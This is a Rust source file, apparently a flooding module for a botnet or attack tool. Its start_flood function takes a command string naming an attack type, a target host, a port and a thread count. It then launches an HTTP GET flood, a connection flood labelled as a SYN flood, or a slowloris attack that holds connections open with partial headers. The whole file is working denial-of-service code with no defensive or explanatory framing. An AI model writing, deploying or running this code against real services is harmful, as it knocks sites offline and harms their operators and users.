use std::net::TcpStream;
use std::io::{Write, Read};
use std::thread;
use std::time::Duration;
use rand::Rng;

pub fn start_flood(params: &str) {
    // Parse params: "http target.com 80 100" or "syn target.com 80 1000"
    let parts: Vec<&str> = params.split_whitespace().collect();
    if parts.len() < 4 {
        return;
    }

    let attack_type = parts[0];
    let target = parts[1];
    let port: u16 = parts[2].parse().unwrap_or(80);
    let threads: usize = parts[3].parse().unwrap_or(10);

    match attack_type {
        "http" => http_flood(target, port, threads),
        "syn" => syn_flood(target, port, threads),
        "slowloris" => slowloris(target, port, threads),
        _ => {}
    }
}

fn http_flood(target: &str, port: u16, threads: usize) {
    for _ in 0..threads {
        let target = target.to_string();
        thread::spawn(move || {
            loop {
                if let Ok(mut stream) = TcpStream::connect((target.as_str(), port)) {
                    let request = format!(
                        "GET / HTTP/1.1\r\nHost: {}\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
                        target
                    );
                    let _ = stream.write_all(request.as_bytes());
                }
                thread::sleep(Duration::from_millis(10));
            }
        });
    }
}

fn syn_flood(target: &str, port: u16, threads: usize) {
    // SYN flood using raw sockets (requires root/admin)
    // For simplicity, simulate with TCP connections
    for _ in 0..threads {
        let target = target.to_string();
        thread::spawn(move || {
            loop {
                let _ = TcpStream::connect((target.as_str(), port));
                // Don't read/write, just connect and drop
            }
        });
    }
}

fn slowloris(target: &str, port: u16, threads: usize) {
    for _ in 0..threads {
        let target = target.to_string();
        thread::spawn(move || {
            if let Ok(mut stream) = TcpStream::connect((target.as_str(), port)) {
                let request = format!(
                    "GET / HTTP/1.1\r\nHost: {}\r\nUser-Agent: Mozilla/5.0\r\n",
                    target
                );
                let _ = stream.write_all(request.as_bytes());

                // Keep connection open by sending partial headers
                loop {
                    thread::sleep(Duration::from_secs(10));
                    let partial = format!("X-a: {}\r\n", rand::random::<u32>());
                    if stream.write_all(partial.as_bytes()).is_err() {
                        break;
                    }
                }
            }
        });
    }
}
